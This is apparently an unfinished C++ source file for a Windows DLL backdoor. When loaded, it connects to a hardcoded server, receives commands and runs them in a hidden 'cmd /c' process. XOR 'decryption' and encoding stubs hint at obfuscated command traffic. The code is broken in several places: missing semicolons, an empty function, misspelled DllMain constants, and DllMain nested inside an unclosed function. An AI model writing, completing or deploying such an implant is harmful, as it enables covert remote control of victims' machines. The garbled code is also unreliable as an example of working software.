#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif

#include <stdio.h>
#include <stdlib.h>
#include <string>
#include <windows.h>
#include <ws2tcpip.h>
#include <iphlpapi.h>
#include <winsock2.h>

#define DEFAULT_BUFLEN 4096
#define PORT "80"
#define SERVER_ADDRESS "127.0.0.1"

std::string Exec(std::string cmd) {

	HANDLE read_handle;
	HANDLE write_handle;
	DWORD bytes_read;
	DWORD ret_code;
	SECURITY_ATTRIBUTES sa;
	PROCESS_INFORMATION pi;
	STARTUPINFOA si;
	std::string cmdline;
	DWORD available_bytes;

	CHAR output_buffer[4096];
	DWORD output_buffer_size = 4096;

	std::string return_str;

	read_handle = nullptr;
	write_handle = nullptr;

	ZeroMemory(&sa, sizeof(SECURITY_ATTRIBUTES));
	ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
	ZeroMemory(&si, sizeof(STARTUPINFOA));

	sa.bInheritHandle = true;
	sa.lpSecurityDescriptor = nullptr;
	sa.nLength = sizeof(SECURITY_ATTRIBUTES);
	si.cb = sizeof(STARTUPINFOA);
	si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
	si.wShowWindow = SW_HIDE;

	cmdline = "cmd /c " + cmd;

	//
	// Create the pipe where stdout will be redirected to.
	//
	if (CreatePipe(&read_handle, &write_handle, &sa, NULL) == FALSE) {
		goto Exit;
	}

	//
	// Set the process to output to our pipes.
	//
	si.hStdError = write_handle;
	si.hStdOutput = write_handle;

	//
	// Create the command prompt process itself.
	//
	if (CreateProcessA(nullptr, const_cast<CHAR*>(cmdline.c_str()), nullptr, nullptr, TRUE, 0, nullptr, nullptr, &si, &pi) == FALSE) {
		goto Exit;
	}

	//
	// Wait for the command prompt process to exit.
	// Maximum execution time of 5 seconds (to prevent hanging).
	//
	ret_code = WaitForSingleObject(pi.hProcess, 5000);
	if (ret_code == WAIT_TIMEOUT) {
		TerminateProcess(pi.hProcess, 0);
	}

	//
	// Check if there was any output.
	//
	if (PeekNamedPipe(read_handle, nullptr, 0, nullptr, &available_bytes, nullptr) == FALSE || !available_bytes) {
		sprintf_s(output_buffer, output_buffer_size, "No bytes to read.\n");
		goto Exit;
	}
	if (available_bytes > output_buffer_size)
		available_bytes = output_buffer_size - 1;

	//
	// Read in the output.
	//
	if (ReadFile(read_handle, output_buffer, available_bytes, &bytes_read, NULL) == FALSE) {
		goto Exit;
	}

	//
	// Append a null-terminator.
	//
	output_buffer[bytes_read] = '\0';
	return_str = std::string(output_buffer);

Exit:
	//
	// Clean up open handles.
	//
	if (read_handle)
		CloseHandle(read_handle);

	if (write_handle)
		CloseHandle(write_handle);
	return return_str;
}

char* encoderesult(char *result, size_t resultlen) {
	unsigned char *output
}


char* decryptfunction(char* command){
	char plaintextcmd[DEFAULT_BUFLEN]
	for(int i = 0; i < strlen(command); i ++) {
		plaintextcmd[i] ^= 0x89;
	}

	return plaintextcmd
}

int entry() {

	WSADATA wsaData;
	int iResult;

	//make da socket
	iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (iResult != 0) {
		printf("WSAStartup failed: %d\n", iResult);
		return 1;
	}

	struct addrinfo* result = NULL,
		* ptr = NULL,
		hints;

	ZeroMemory(&hints, sizeof(hints));
	hints.ai_family = AF_UNSPEC;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;

	// Resolve the server address and port
	iResult = getaddrinfo(SERVER_ADDRESS, PORT, &hints, &result);
	if (iResult != 0) {
		printf("getaddrinfo failed: %d\n", iResult);
		WSACleanup();
		return 1;
	}

	SOCKET ConnectSocket = INVALID_SOCKET;

	ptr = result;
	ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype,
		ptr->ai_protocol);

	iResult = connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
	if (iResult == SOCKET_ERROR) {
		closesocket(ConnectSocket);
		ConnectSocket = INVALID_SOCKET;
	}

	int recvbuflen = DEFAULT_BUFLEN;
	const char* sendbuf = "Hello Potato";
	char recvbuf[DEFAULT_BUFLEN];

	int sendresult;

	sendresult = send(ConnectSocket, sendbuf, (int)strlen(sendbuf), 0);
	if (sendresult == SOCKET_ERROR) {
		printf("send failed: %d\n", WSAGetLastError());
		closesocket(ConnectSocket);
		WSACleanup();
		return 1;
	}

	printf("Bytes Sent: %ld\n", iResult);


	do {
		iResult = recv(ConnectSocket, recvbuf, recvbuflen, 0);
		if (iResult > 0)
		{
			//recvbuf = decryptfunction(recvbuf);
			recvbuf[recvbuflen] = '\0';
			std::string report = Exec(std::string(recvbuf));



			//send the resulting data
			//std::string encryptedmsg = encrypt(report);
			//set sendbuf to the encrypt message and this should be gucci?

			sendresult = send(ConnectSocket, sendbuf, (int)strlen(sendbuf), 0);
			if (sendresult == SOCKET_ERROR) {
				printf("send failed: %d\n", WSAGetLastError());
				closesocket(ConnectSocket);
				WSACleanup();
				return 1;
			}

			printf("Bytes received: %d\n", iResult);
		}
		else if (iResult == 0)
			printf("Connection closed\n");
		else
			printf("recv failed: %d\n", WSAGetLastError());
	} while (iResult > 0);

BOOL APIENTRY DllMain(
   HANDLE hModule,	   
   DWORD ul_reason_for_call, 
   LPVOID lpReserved )     
{
   switch ( ul_reason_for_call )
   {
      case DLL_PROCESS_ATTACHED:
	  	int retval = entry();
      	break;
      
      case DLL_THREAD_ATTACHED:
	  	int retval = entry();
      	break;
      
      case DLL_THREAD_DETACH:
      	break;
      
      case DLL_PROCESS_DETACH:
      	break;
   }
   return TRUE;
}


}